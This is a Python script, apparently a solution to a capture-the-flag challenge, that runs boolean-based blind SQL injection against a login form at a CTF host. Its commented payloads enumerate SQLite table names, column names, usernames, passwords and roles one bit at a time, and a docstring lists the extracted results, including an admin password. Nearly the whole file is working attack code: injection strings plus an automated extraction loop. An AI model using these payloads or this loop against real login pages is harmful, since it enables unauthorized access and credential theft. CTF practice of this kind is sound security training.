import requests

'''

    what type of db is this? sqLite
    how many tables are there? 2
    what are the table names?
        sql_sequence
        credentials
    how many entries are there in the credentials table? 2
    how many columns are there in the credentials table? 4
    what are the column names in credentials?
        id
        username
        password
        role
    what's the username for each user?
        admin
        user
    what's the password for each user?
        Sup3rS3cr3tP4ssw0rd_You_Should_Not_See
        user
    what's the role for each user?
        admin


        
'''

def doThing(c_pos, bits):
    data = {
        'username': 'admin',
        #'password': "meow"
        #'password': "' or 1=1-- -"
        #'password': "' or sqlite_version() like '%%'-- -"
        #'password': "' or (select count(tbl_name) from sqlite_master where type='table')=2-- -"
        #'password': f"' or (select unicode(substring(tbl_name, {c_pos}, 1)) & {bits} from sqlite_master where type='table' limit 1 offset 0)={bits}-- -"
        #'password': "' or (select count(*) from credentials)=2-- -"
        #'password': "' or (select count(name) from pragma_table_info('credentials'))=4-- -"
        #'password': f"' or (select unicode(substring(name, {c_pos}, 1)) & {bits} from pragma_table_info('credentials') limit 1 offset 3)={bits}-- -"
        #'password': f"' or (select unicode(substring(username, {c_pos}, 1)) & {bits} from credentials limit 1 offset 1)={bits}-- -"
        #'password': f"' or (select unicode(substring(password, {c_pos}, 1)) & {bits} from credentials limit 1 offset 0)={bits}-- -"
        'password': f"' or (select unicode(substring(role, {c_pos}, 1)) & {bits} from credentials limit 1 offset 1)={bits}-- -"
    }
    r = requests.post('http://public.ctf.r0devnull.team:3023/', data=data, allow_redirects=False)
    # print(f'{r.status_code=}')
    # print(f'{r.headers=}')
    # print(f'{r.text=}')
    if r.status_code != 302:
        print(f'{r.status_code=}')
        print(f'{r.headers=}')
        print(f'{r.text=}')
        print('unexpected response')
    success = 'dashboard' in r.text
    return success

c_pos = 1
word = ''
while True:
    c = 0
    for i in range(8):

        bits = 2 ** i
        print(f'[{c_pos}][{bits}]')

        r = doThing(c_pos, bits)

        if r:
            c = c ^ bits
            print('yup :)')
        else:
            print('nope :(')
    word += chr(c)
    print(f'{word=}')
    c_pos += 1

# r = doThing(1,1)
# if r:
#     print('yup :)')
# else:
#     print('nope :(')